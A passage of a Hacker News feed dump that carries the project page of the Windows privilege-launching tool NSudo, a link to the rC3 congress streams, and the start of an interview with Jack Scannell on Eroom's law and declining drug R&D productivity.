0c22nj5m/Ct38HvhntaQYvFKa2v2ZMrm1solSXvvxob8S9xC50pKu0ktbSfVzHnshwb6oLbBfsZNe7fdzH0spg89ZegTEI9u/f/7GPfWz9+vV6bMmhFGVIj/s/TBf9kl/maK9+4YX5prcRQ7dhasJR/6WQyYZ0gn+DKZsQ/Fsi/RamPoEKdRde6eDEmO1kcybGfHJpUSqlrcKOH5WJi2wecOdxQzqhdGqzlS9heBTytJykot/DdNE/hy9zXOeVX70aLozY3P6iUHdNbyOGrt9M3T+/FASoOfQakzptySz6Ztq8b/IxF1N+jnTs7aWqX2wrOlm/+eaub/c1pOiG/EcdcPKnxnDxeVqZpKKvw7TF/6PJdQjT9DCN1HJ0DnCYOkHq+XpuglW5vHJ+bm2Tzd3X775Y/mgHVbmCIeLytDJJRV+HqWbYglqcFkV4bb7pbcTQVpg2gq/QzTuovI/Ojje05FLTpGr2Rb0ohKlZ1tNwbSNM0/dE07WxNZaLtHCOCcHgrVJIRffS5a5X6Pj+ApsHk03NTnZLbL106mA+hpLEaGWSir4O0z9Y8Lv5jkzTXv3Ca/NNbyOGtsLURmFKIzH7V5a1UJgzKGHqkstaPjbmY8vxs1zJHPrZwg2n03V5NqHyNwEW2tyPZVv5j24HHbezw80xYvo6TKUtmqcyR3v1Cy/MN72NGNoL0wFUDFNgiPR7mErzeeorN+097ipCDrVXP38BYdPbiKGtMNW3oTwd61eEKYbYAIRpZfN/ZEr6rlPwljV7X9VuNOEF+Ka3EQNvpsDgGs4wlST90LrH9GB+/syvFpe33s64aK/uQph2jTDFEBvUMD3nvx7xAec64vmXfy0fC0kqCNM+QZhiiA1qmIZNo86Sw0KSij/88oNv/srezlr49wOEJ/VNbyOGUQhTYIjpT/TFDEaY1qpwXtf0NmIY+jAFIAhTwhRABIQpYQogggEL0/Eth7UXT+G8rultxECYAqNgkML04i2H3/yV7LvwfDcfQP8YmDD9t9sOhUkqCFMA/WMwwlQOC0kqCFMA/WNg3kzrUziva3obMRCmwCggTAlTABEQpoQpgAgIU8IUQAT9G6ZL2/Q2YiBMgVFAmFY3vY0YCFNgFBCm1U1vIwbCFBgFhGl109uIgTAFRgFhWt30NmIgTIFRQJhWN72NGAhTYBQQptVNbyMGwhQYBYRpddPbiKGtMF3eGp0NoG8QptVNbyOGdsNU/1+C5ghToA8RptVNbyOGvgvT2fGVK8dn9cAqV1rhVnW2tlLErYCeI0yrm95GDLWG6cok1FoUdR6mMi84iVtVWGunpBqTWk01O1HlVsBAqStM4dUbph2kTzmzWkwxM63R8FMrEzA8nGy0GO+qxcsA+hJhWruehqnNo/FG7s1Qanrsss3MkUwsVOw+2dSKVHOzsoR0x36tkzuUuY1JW7GXpH2zJHtpzeZkW5kJTrpXVklrpTnlRUAvEaa1qzdMNT8sCRGbKBpU5RdDG1w2dYIAcqtMwQ1bWgmlJb+tKxRmBofSLV5SOpqdyV9StlX5MqRS2KE0Rz5mW6ZDQA8RprXr/ZupVnzfBE3K5U44RzLIVcJpRj6SslUSZLbnV/ndRLiJq4cTfD8Nw8mGPQ63Cncw0suzG2QzddSRvUzgFq8Z6CHCtHZLHKYmd9KSr4RzfFqF9RIzMWAmVq4qbxJWsr70bAK6Q1cPP5o5qTS9jWZzFJGKJUOY1m7pwzStSNekUqEiyaMVk0RNckgnKpdublWwm1E4FGEl6Eu30dAs1bqOli8jSNNmc2bHG/kZQI8RprWrN0zte2Jq5fhkkCRpqpjgccPuW/FS10LpK/HykFMMKJtu7lyFoeLMfKXQ93no6n7UDKVcxd+DqJ6TzXDjQI8RprWrNUxHjmRmk5dnYGkRprVrN0xbobNPnNCXsYAODJfgxZQoRZ8iTGvXVpgCGFCEae0IU2AUEKa1I0yBUUCY1o4wBUYBYVo7whQYBYRp7QhTYBQQprUjTIFRQJjWjjAFRgFhWjvCFBgFhGntCFNgFBCmtSNMgVFAmNaOMAVGAWFaO8IUGAWEae0IU2AUEKa1I0yBUUCY1o4wBUYBYVo7whQYBYRp7QhTYBQQprUjTIFRQJjWjjAFRgFhWjvCFBgFhGntCFNgFBCmtSNMgVFAmNZOPsUARoE+800QpgAQAWEKABEQpgAQAWEKABEQpgAQAWEKABEQpgAQAWEKABEQpgAQAWEKABEQpgAQAWEKABEQpgAQAWEKIL7rho7eWHOEKYD4JH2eHCKEaRuSL/yIRqN10PQRyiNMR5f8nJgH0CbC1CNMFWEKdIAw9QhTFYZpkiTaA7AgwtQjTBVhCnSAMPUih+ns+EpJImfl+KxWBwFhCnSAMPVihqlJ0ixBJxsDlaeEKdCBaGG6c81y+xLmjE1ouU/0OkwbhfCUcJWC+dhopC+sjcl0SAt2iZ05LulrBXN6l8aEKdCBmGG6fM3Ocr8/9DpMTXRq15GX08ZkmInmbVWi0tZtIQtcn6Ey6KYTpsCS2rVrl/YChWItYToxZl5NbWXNmDyO9j01e3VND918U3cvstIznWxiNiE87kTfhGlWt0k56V9Lnfyc3PzeIUyB0PPPP//xj39cQkSPLTmUogzpcdwwdXlg2NSzFReTNl+zyLQ9l7jmcEyYoYkxWZcO22Pp6DRDhjqN016HafMv80thWohLwhToP4U8LSepqOXN1PXLFd/XNDUlk5hSkYL7aNJTBAFqDr203qZeh6nEYBCnkpv2KAxH/RLeDKVf51uVYZrfrm6EKVDm81SUk1TUEqbudTKsFPo2E+XHsQmXqNoNkjKN1HBhF+R29MaaixmmwgRgKvg+khf8VqlWbOL6AHVDhCnQN1yeViapqCVMJQmln8tBE44uK6Xse2PLdYp0helKTxe59dnCbixBmFYIg7KPEaZAMxKjlUkqYoapfbmybPrlwjSc4LPRhW6ha9LT0UK4c7hhO3odpnq5JYQpMKyihWl/64830wFBmAIdiBim9tUrRwf6AGHahjBMAbSIN1OPMFWEKdABwtQjTBVhCnSAMPUIU0WYAh0gTD3CVMnPCRqN1kHTRyiPMAWACCR9hozeWHOEKQBEQJgCQASEKQBEQJgCQASEKQBEQJgCQASEKQBEQJgCQASEKQBEQJgCQASEKQBEQJgCQASEKQBEQJgCQASEKQBEQJgCQASEKQBEQJgCQASEKQBEQJgCQAS1hOmxY8f2PLDnwIEDegwgr/APfA5B0xtL6b9CN0T0xpqrJUzn5h7duuWunTvvPH78uJYABApJNARNbywl6aP/SvJQWJowPXTo0HXX33TnnRtvvnnznj17tAog4AJIn9QBR5g6kcP08ccfu+66qeuv33hwbtm2jR/ctHm3DgAIEKaDZQnCdOvWrVNTd07/z0fm55MHd/zW9s0TTzzxhI4BSBGmg2UJwvTmm7dPT294fOZUCdP5/0u2bnjPli3b+J1ToIAwHSy9DtMf/vCHO++4dG7XqZf99/LPfuZ9a7587mOzr7/n3n1btmw/evSoTgJAmA6anoapnG/Tpi33TJ/9yxeTT33q/E+e/4XzzvvM/976lrunv3j3vft3757ReQAI03btXLN8+ZqderAEehem8oX8jh079j/81IF9y37xs5M/99m/O//8f/zEef9wz62n77j67YcPPXPblh06dfjMjq9cOT6rB8NiKG+qn0QLU0mZxFuavKknTO2N+RvqOEwjpXDvwnRqavqZn75w162r51/63Veee92F/3zuuR/4m/e+9y93Tf3+L3702ruuOu3Rvbd382f4swdbHvLEH0w2ksak67auy5gwF+DZs/db7tgrzK7IX15w5Ytfb4s3Jf8FvOw/Rf4KgvNm1VxRrByfLFQak4VrcIeVRT2w1+MPzSnCMVdp/ydMPWKGaZg4ydiE6/dQLWFq7mtszN/b6ITpnXfN7tp10+P3vHH+xJteOfK6f7pg1Tvf9RfvOXvV7qnfe3nfbx687eQ7rvmr22/fcezYMV3QJh+a5tlZuTI4yD0svRCe1D26S3IZCzDX02j4a9LLC2NmsrFopLRwUzIlTNBs0+oLSPtuSXn/RSvusLKoB4b/BTa8YVU+xdKpJUyfnBhzYRoWXd9+XDOmv1LFTdw6wtRdtdyP3oc5lmx1l5/emxRdodldBzP8SGd6FKaHDh165qfH77jhw/MnXj//3GmvPPP688/7k3es+PMPnHv23lt/56WZU17encxevey+mR899NBDuqZNkw19CMwTGxy4jjwj+glzj499ZsbNO5O+3di+YR4z90SV6/mN9EE0FT2bcsv1wD65vpIt1xnBfqVKkyXK7xn021vrQ0WX++NUum2un+1ZPkt+eW59jhvIsiw3Mb2M8upFK+6wsqgHlp9WvOCqyUunljD12VOOFZsqmqFZRMVRQ5imNxDeUXrRaVfG9I5MRXrpIi35hb7YhV6EqXzxvml6213XnTP/9LJXHn3dy/uS47uSc9+dLDv1t1e964/v33DS0c3J0ankxFRy5+Tnd+95fPb+Tn4yp0/B7HhDftAQLcVDWjIPUjoU9t3z7fYq180PwSp7Crvc9VJ+yA9qJbicYI7KLsyfUzrNl4SHrt/+Wp0RHOYiMVylfTNFx0sVKWRrRfHYS/eVpW7/tGCERXs5SoqFimweLhTusLKoB8qcxH/5EqqavFRihql+xpr8DqPrlyuuH0P8MM2uME3TwvVLdi5acf2w2IXaw/To0aNTU9M/fuTp53a95sX7kxP3JT+7N3nhnuSDZydvfNMZH/nw2ft+cNLRm5OjNyXP3Zhs/uYbdt+9dfOW23VxW+QxkIfDfcwf6Kj+bEofS//MlPvhx3I9rLh+gQzpmYJ3N7dcq469tuJkk01ZnlUucdyeuX77a10n3Er4bcJ6eWZlpdkVhrJ6GpxmYSrcrbB80Yo7rCzqQaqyaPgvapZezDD1qZG+euYSxPXLFdePIXqYmlsJmIstXP/whal82T616Y7Nmzf+/H7zQnr8nuSFu5Of70o+8dfJ6W9dMfbR9z907UlHb0yeuyE5sjF55Nsnb7rkQ/fsflQXt0eeTPMFvnua7Qtq+EV++oiUn7dyv9mc9NnPKq5fUB4qb+hIpXBhtpvlWXmJFw51sVa6jfHyTPvJLJ9i0UoYpmYTP5YxswJmht8k3CHc2Vm04g4ri3qQqiwaQx2mwn/h68LF1kxXJoTTIuWLFztMg6sX7t00uOZ0uOrL/MJdZ2Pdqj1Mb9u2e9ONa/dfv+zYXcmxO5NjO5OjW5MXtib3X5FcdP6y6W8kL04lz/4gefba5PCG5PDVyWOXnXzTv6/csmWrrm+HPAdCH4XwIHhypGse3/BZKvfDj2E9TAc/Kp1CZIQLnWx5LmzCmbqN+10KLchxaYlnFuhIJ2vT89rIS9/W/Ww3weybP0XwGQgqOimYrkwlKNlf6fKz3H5S013d5djxsOiUK8H1CN26MK1iVZNin6klTF10pG9y7tcz/ZZ4OC2/pHuRw7R4eTZNJ9L7EeGNaCnIUCv8gwAmdINFnak3TA8ePHjrrZu3fu+cI3e8RmL02B3Jse3J8S3Ji9uTz40lbzht+SfH3jV3lUnSZ76fHL7GtCMbkru/uWx6690dfCfKPEv+CTEH2UNrnlBLv4ccPkvlfvgxrEvHbyRcRYaC59kIFzq+YianbKV4YcEJdI/SEs+PtL3WX48j68xhxezSKbIrzirZuiwkvXDTiqRz557MFe2S8h+EKk5T4QmK1yPs+7X2RXqFxctINasvhWhh2gcih2lfqjdMJUlvmfz8j29c9rN7Tzlx1ykndr7m+I6TJElf2pF89H3JO979/r//xN8+ePmyI9f/xpGNpzw7uezI5CnPbVz25FUnb9t6x81Tm5999lndqA9JCFREBxBNxDDVX0rydKwnooep3kOeji2RGsN0elqydMfMNafvvvqs3VeetfuKt7p23xVnSJu94oyt//GWuy87fdf6M+9dd5Zp68/aZdt968/adsk7t0zdeMNNm3SvvpG9+xGlqFnEMF1y0cO0D9UYpjfceNOu+2b2PXDfvgd2P/TA/Q/vfeDxRx/+yROPHzvy7PGj0o6cOHZEPko7/PRPDh/8yROP/ljm7H9wViZL2zP7wPbtw/s/mAKLIUwHS41humnTpiuu+O4ll6wz7dJ1l61bv279d9avn7h84sqJiaukXXnl1RPSJq76zsSVl39n4vLLv/vtdZdf9u3LL71s/aWXrrv00suuueYa3QsYPYTpYKkxTAF0gzAdLIQp0KdcAA1T0xtLEaYAeqGQREPQ9MZSkj5DRm+sOcIUACIgTAEgAsIUACIgTAEgAsIUACIgTAEgAsIUACIgTAEgAsIUACIgTAEgAsIUACIgTAEgAsIUACIgTAEgAg1TAEBXLrzw/wFef6aBg4/PPgAAAABJRU5ErkJggg==" alt="Screenshot"></p>  <p>Patreon: <a href="https://www.patreon.com/MouriNaruto" target="_blank" rel="noopener noreferrer">https://www.patreon.com/MouriNaruto<span> <span>(opens new window)</span></span></a></p> <p>Áà±ÂèëÁîµ: <a href="https://afdian.net/@MouriNaruto" target="_blank" rel="noopener noreferrer">https://afdian.net/@MouriNaruto<span> <span>(opens new window)</span></span></a></p> <ul><li>If I have reached the "$1,000 per month" goal, I will release 2 major
releases in a year.</li> <li>If I have reached the "$2,000 per month" goal, I will obtain an extended
validation (EV) code signing certificate and use it for signing the projects
binaries.</li></ul> <p>Thanks for your support.</p> <p>Kenji Mouri</p> <h2 id="about"><a href="#about">#</a> About</h2> <h3 id="prototype"><a href="#prototype">#</a> Prototype</h3> <p>NSudo Launcher is based on SuperCMD by Raymai97. Visit
<a href="http://bbs.pcbeta.com/viewthread-1508863-1-1.html" title="here" target="_blank" rel="noopener noreferrer">here<span> <span>(opens new window)</span></span></a> for more
information about SuperCMD.</p> <p>NSudo Devil Mode is based on the Dism++ God Mode, with new features and several
improvements.</p> <h3 id="features"><a href="#features">#</a> Features</h3> <ul><li>Distributed under the MIT License.</li> <li>Provide the x86, x86-64, ARM, ARM64 binaries.</li> <li>Support Windows Vista and later.</li> <li>Using VC-LTL and libkcrt from Chuyu Team for smaller binary size.</li> <li>Using C++17, but only use core language features in the most cases.</li> <li>NSudo Launcher
<ul><li>Launch programs with TrustedInstaller access token.</li> <li>Launch programs with System access token.</li> <li>Launch programs with current user access token.
<ul><li>Note: If the User Account Control has not been disabled, the privilege of
this mode is similar to the standard user.</li></ul></li> <li>Launch programs with current process access token.
<ul><li>Note: The privilege of this mode is similar to the elevated user.</li></ul></li> <li>Launch programs with current process access token with the LUA restriction.
<ul><li>Note: The privilege of this mode is similar to the standard user. And the
implementation is similar to the iertutil.dll's from the Internet
Explorer.</li></ul></li> <li>Support launching programs with the specified privileges option.
<ul><li>Note: "Enable All Privileges" and "Disable All Privileges".</li></ul></li> <li>Support launching programs with the specified mandatory level (or integrity
level) option.
<ul><li>Note: "System", "High", "Medium" and "Low".</li></ul></li> <li>Support launching programs with the specified process priority option.
<ul><li>Note: "Idle", "BelowNormal", "Normal", "AboveNormal", "High" and
"RealTime".</li></ul></li> <li>Support launching programs with the specified window mode option.
<ul><li>Note: "Show", "Hide", "Maximize" and "Minimize".</li></ul></li> <li>Support waiting for the created process to end before exiting.</li> <li>Support launching programs with the specified current directory.</li> <li>Support launching programs with the current console window.</li> <li>Support shortcut list.
<ul><li>Note: You can custom it via editing NSudo.json.</li></ul></li> <li>Support multiple command line style.</li> <li>Support multi-languages.
<ul><li>Note: Chinese Simplified, Chinese Traditional, English, French, Italian
and Spanish.</li></ul></li> <li>Full High DPI Support.
<ul><li>Note: As good as the implementation from Windows Shell (conhost.exe),
with the full Per-Monitor DPI-Aware support under Windows 10 Build 10240
and later version and full System DPI-Aware support under Windows Vista
to Windows 8.1.</li></ul></li> <li>Full accessibility support.
<ul><li>Note: You can use NSudo Launcher with Windows Narrator smoothly.</li></ul></li> <li>High performance.
<ul><li>Note: Because it don't need to create the windows service and the windows
service process.</li></ul></li> <li>Provide C APIs and .Net Core bindings for developers.</li></ul></li> <li>NSudo Devil Mode
<ul><li>The most elegant solution for developers who want to bypass the file and
registry access checks for the process with the Administrator privilege.</li> <li>Hook APIs via the Microsoft Detours library for the maximum compatibility.</li> <li>The binary only depend on the exported named APIs from ntdll.dll.</li></ul></li></ul> <h3 id="third-party-projects-which-uses-nsudo"><a href="#third-party-projects-which-uses-nsudo">#</a> Third-party projects which uses NSudo</h3> <ul><li>MSMG ToolKit</li> <li>Sledgehammer (WUMT Wrapper Script)</li> <li>Dism++</li></ul> <h3 id="system-requirements"><a href="#system-requirements">#</a> System requirements</h3> <ul><li>Supported OS Version: Windows NT 6.0 or later</li> <li>Supported CPU Architecture: x86, x86-64(AMD64), ARM, ARM64</li></ul> <h3 id="third-party-introduction"><a href="#third-party-introduction">#</a> Third-party introduction</h3> <ul><li>HowToDoNinja: <a href="https://howtodoninja.com/how-to/nsudo-run-programs-with-full-admin-privileges-windows/" target="_blank" rel="noopener noreferrer">https://howtodoninja.com/how-to/nsudo-run-programs-with-full-admin-privileges-windows/<span> <span>(opens new window)</span></span></a></li> <li>MajorGeeks: <a href="https://www.majorgeeks.com/files/details/nsudo.html" target="_blank" rel="noopener noreferrer">https://www.majorgeeks.com/files/details/nsudo.html<span> <span>(opens new window)</span></span></a></li> <li>softpedia.com: <a href="https://www.softpedia.com/get/Tweak/System-Tweak/NSudo.shtml" target="_blank" rel="noopener noreferrer">https://www.softpedia.com/get/Tweak/System-Tweak/NSudo.shtml<span> <span>(opens new window)</span></span></a></li> <li>TrishTech.com: <a href="https://www.trishtech.com/2018/11/nsudo-run-programs-with-full-privileges-in-windows/" target="_blank" rel="noopener noreferrer">https://www.trishtech.com/2018/11/nsudo-run-programs-with-full-privileges-in-windows/<span> <span>(opens new window)</span></span></a></li> <li>Wilders Security Forums: <a href="https://www.wilderssecurity.com/threads/396818" target="_blank" rel="noopener noreferrer">https://www.wilderssecurity.com/threads/396818<span> <span>(opens new window)</span></span></a></li></ul> <h2 id="usage"><a href="#usage">#</a> Usage</h2> <h3 id="quick-start-for-nsudo-launcher"><a href="#quick-start-for-nsudo-launcher">#</a> Quick Start for NSudo Launcher</h3> <p>Please go to the [CPU Architecture] folder and click NSudoLG.exe. Follow the
prompts. For example, if you want to use 64-bit NSudo on your Intel or AMD
device, you need to go to the x64 folder and click NSudoLG.exe</p></div><div> <p><span>Last Updated:</span> <span>6/4/2020, 1:35:02 PM</span></p></div></div>]]>
            </description>
            <link>https://m2team.github.io/NSudo/en-us/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25549914</guid>
            <pubDate>Sun, 27 Dec 2020 09:28:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remote Chaos Communication Congress ‚Äì Streams]]>
            </title>
            <description>
<![CDATA[
Score 219 | Comments 33 (<a href="https://news.ycombinator.com/item?id=25549762">thread link</a>) | @doener
<br/>
December 27, 2020 | https://streaming.media.ccc.de/rc3/ | <a href="https://web.archive.org/web/*/https://streaming.media.ccc.de/rc3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://streaming.media.ccc.de/rc3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25549762</guid>
            <pubDate>Sun, 27 Dec 2020 08:42:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Life After Eroom‚Äôs Law]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 39 (<a href="https://news.ycombinator.com/item?id=25549702">thread link</a>) | @apsec112
<br/>
December 27, 2020 | https://refoundable.com/research/life-after-erooms-law-interview-with-jack-scannell.html | <a href="https://web.archive.org/web/*/https://refoundable.com/research/life-after-erooms-law-interview-with-jack-scannell.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>    <p>One of our founding beliefs is that too many people are making the rational choice to look for secrets in a handful of technology areas, in particular, those areas which have seen the most progress over the last half-century, namely computers and finance, with the possible addition of shale oil in the last decade.</p> <p>The necessary and counterintuitive approach at this point, we believe, is to start with the technology areas worst hit by neglect, stagnation, and rising costs, and figure out how to restart their <span>progress.<sup><a href="#fn1" id="r1">1</a></sup></span></p> <p>Take healthcare for example. While computers got faster and cheaper year after year for the last five decades, healthcare costs shot three to four times higher than inflation in the last two decades <span>alone.<sup><a href="#fn2" id="r2">2</a></sup></span></p> <p>And if the recent coronavirus pandemic that swept the globe in a few short weeks has shown us anything, it‚Äôs how close our healthcare systems truly are to their breaking point.</p> <p>Yet, unlike other stagnant technology areas, like defense or nuclear energy, most people will agree that healthcare is both badly broken and vital to fix, so by starting there at least, fewer people will try to stop an ambitious founder.</p> <p>Of all the healthcare fields that one could start with, many fashionable and less fashionable areas receive a fair bit of attention already from venture capitalists and philanthropists‚Äîit‚Äôs hard to tell them apart sometimes. Yet there‚Äôs one big area that has stagnated despite the close scrutiny it receives, and that‚Äôs pharmaceuticals.</p> <p>The great promise was that by unlocking the secrets of biology, we would create all kinds of life-saving, even life-enhancing medicine, from a full-course-meal in a pill to a general cancer cure.</p> <p>Moreover, breakthroughs in pharma would open up new avenues of research in many ancillary fields, from nutrition and anti-aging to preventative medicine writ large. The more progress we‚Äôd make, the less effort we‚Äôd have to put in to uncover new secrets.</p> <p>However, today‚Äôs pharma industry looks nothing of the sort. Looking from the outside, it seems that despite a growing mountain of scientific and technical know-how, the cures only seem to get harder and harder to find. So, one might reasonably ask: What went wrong?</p> <p>To cut the Gordian knot of pharma‚Äôs long stasis, we must turn to the one robust measure of progress the industry has, known simply as Eroom‚Äôs law. The name is already very suggestive, as it‚Äôs quite literally an ironic backward spelling of Moore‚Äôs law‚Äîthe computer industry‚Äôs relentless benchmark of progress‚Äîwhich makes it a fitting place to&nbsp;start.</p> <p>Race to the bottom</p> <p>Eroom‚Äôs law is the observation that the cost of developing a new drug roughly doubled every nine years from 1950 through 2010. All in all, it shows a roughly 80-fold decline in the productivity of drug R&amp;D.</p> <p>It‚Äôs hard to say what‚Äôs worse, the staggering decline, or the fact that it went on unchecked for six decades. Either way, as the total sum of our efforts to look for life-saving secrets, Eroom‚Äôs law leaves no doubt that our ability to explore the frontier has atrophied catastrophically.</p> <figure> <img alt="A graph of Eroom‚Äôs law shows that the cost of developing a new drug roughly doubled every nine years from 1950 through the 2010." id="img-eroom-1" src="https://refoundable.com/assets/img/buf.png" data-echo="/assets/img/eroom-1.png"> <figcaption id="cap-eroom-1">By 2010, the total R&amp;D spend per drug approved was about a&nbsp;hundred times higher, in real dollars, than it was in 1950.<span>Graph by Jack Scannell</span></figcaption> </figure> <p>Although some aspects of this disturbing trend line were known since the 1980s, Eroom‚Äôs law was formally articulated in 2012, at the tail end of the long decline, in a seminal paper published in <em>Nature Reviews Drug Discovery</em> by four co-authors led by Jack Scannell.<sup><a href="#fn3" id="r3">3</a></sup></p> <p>In a field plagued by narrow specialization, Jack Scannell is something of a renaissance man, having seen the industry from a distance and up close while working in drug research, private consulting, pharma and biotech investing, and policy advising.</p> <p>When Scannell worked as an investment analyst, he used to ask the top executives at major pharma firms to explain why the productivity of drug R&amp;D kept falling for so long, when the science and technology inputs were getting cheaper and more efficient all the time. Generally, he‚Äôd get the same kind of answer: the industry had run out of ‚Äúlow-hanging fruit.‚Äù</p> <p>In the course of his own later investigations, Scannell began to focus on a serious technical problem called ‚Äúmodel validity,‚Äù which he found was holding back progress in the science of drug discovery. And while everyone can acknowledge that there‚Äôs a host of issues to fix with the drug industry, we agree with Scannell that starting with the science could prove decisive in the heroic effort needed to restart general progress in the field.</p> <p>So, we sit down with Jack Scannell to discuss the beginning and end of Eroom‚Äôs law, the technical frontier of drug discovery, and whether drug R&amp;D can help win the fight against COVID-19 and prevent future pandemics.</p>  <hr>  <p id="q1">Your 2012 paper diagnosed the decline in drug R&amp;D productivity over the preceding six decades. What moved you to write it? And how did you land on the term Eroom‚Äôs law?<a href="#q1"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a></p> <p>There was this nagging puzzle: Since the 1950s, lots of important R&amp;D inputs had got tens, hundreds, even billions of times cheaper, while the number of drugs approved per $1 billion spent on R&amp;D had fallen by roughly two orders of magnitude. That struck me as an ugly contrast.</p> <p>Many people bemoaned the R&amp;D productivity problem before, but not enough people had drawn attention to the contrast between input and output efficiency. I thought it was an important public policy problem, and it seemed to attract less attention than it deserved.</p> <p>I remember talking about the contrast with a friend of mine, William Bains. We chatted that drug industry productivity looked like Moore‚Äôs law backwards, and that‚Äôs how the term ‚ÄúEroom‚Äôs law‚Äù was born.</p> <p id="q2">The drug industry already knew it had an R&amp;D productivity problem, so what was missing in previous attempts to diagnose the issue?<a href="#q2"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a></p> <p>As long ago as 1980, there was a great paper on the R&amp;D slowdown by Fred Steward and George Wibberley, which we cited along with some other good work in our <span>paper.<sup><a href="#fn4" id="r4">4</a></sup></span></p> <p>However, in general, I thought there were two problems:</p> <p>First, a lot of the diagnostic efforts were private. They were happening in some of the drug and biotech companies, but they weren‚Äôt making it into the public domain, so they couldn‚Äôt affect science policy or investor behavior.</p> <p>Second, what did often make it into the public domain were not really diagnoses per se, but attempts to sell ‚Äúsolutions‚Äù that, in many cases, were largely unrelated to the core problems of drug R&amp;D.</p> <p>If, for example, you were an academic geneticist, low R&amp;D productivity was an occasion to promote more investment in genomics. If you were an investment bank, you saw an opportunity to promote M&amp;A to Big Pharma. If you were a consulting firm, you might say that the reporting lines or the business processes were wrong; things you could fix with a re-engineering project.</p> <p>At the time, I was working as an investment analyst. A bad prognosis can be very interesting to an analyst, because if you think an industry is in real trouble, you don‚Äôt have to own it. That meant I had a different set of biases to most people. And I didn‚Äôt have any particular solution to sell.</p> <p>On the whole, I think lots of people would‚Äôve been better qualified to write the paper, but their day jobs meant they couldn‚Äôt write it.</p> <p id="q3">Eroom‚Äôs law was widely adopted after your paper came out. What was the general reaction you saw after you published?<a href="#q3"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a></p> <p>People were certainly glad that someone had put names to things that they knew, or suspected, were happening already. Apart from Eroom‚Äôs law itself, people liked something else we talked about in the paper, which I called the ‚ÄúBetter than the Beatles‚Äù problem.</p> <p>Imagine how hard it would be to sell new pop songs if every new song had to be better than the Beatles, if you could download all the old Beatles records for free, and if no one ever got bored of listening to the same Beatles songs over and over again.</p> <p>That‚Äôs analogous to the problem the drug industry faces, in that some old drugs are very good, they cost next to nothing when their patents expire, and doctors don‚Äôt get bored of prescribing them.</p> <p>So in many therapy areas, you end up with this ever-expanding back catalog of virtually free and very good medicine, against which any new medicine would have to compete. That reduces the value of as-yet-undiscovered drugs. It also pushes drug R&amp;D towards the areas where we don‚Äôt have a catalog of good cheap stuff, or precisely the areas where R&amp;D is likely to be harder.</p> <p>Inevitably, people also appropriated Eroom‚Äôs law to justify what they wanted to do anyway. That reminds me of a line from a famous British TV comedy, <em>Yes, Prime Minister</em>, which is about a hapless politician who is ruthlessly managed by his civil servants: ‚ÄúSomething must be done. This is something. Therefore, we must do it.‚Äù I do occasionally see papers that make the same kind of <span>argument.<sup><a href="#fn5" id="r5">5</a></sup></span></p> <p>However, to be honest, apart from a few people in the drug industry telling me that the paper became required reading, and aside from seeing the Eroom graph in a lot of presentations, it‚Äôs not clear to me that anything different was done after the paper was read.</p>  <hr>  <p id="q4">The standard fixes to raise drug R&amp;D productivity tend to focus on process efficiency and cost-cutting. Why haven‚Äôt these solutions been enough to stop and reverse Eroom‚Äôs law?<a href="#q4"><svg viewBox="0 0 16 16" version="1.1" width="16" height="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a></p> <p>Simply put, they‚Äôre addressing the wrong class of problems. Suppose we were looking at the oil industry, and we found that it cost a hundred times more to produce a barrel of oil today than it did in 1950, despite the fact that your technology for pumping oil out of the ground got billions of times cheaper.</p> <p>Under those circumstances, no one would say the primary problem that the oil industry has is that the reporting lines are wrong, and we need to fix the organizational structure and get the drill procurement processes sorted out. It would be obvious that there‚Äôs a geological explanation for the problem.</p> <p>When drug companies talk to their shareholders, I suspect they talk about processes ‚Ä¶</p></article></div>
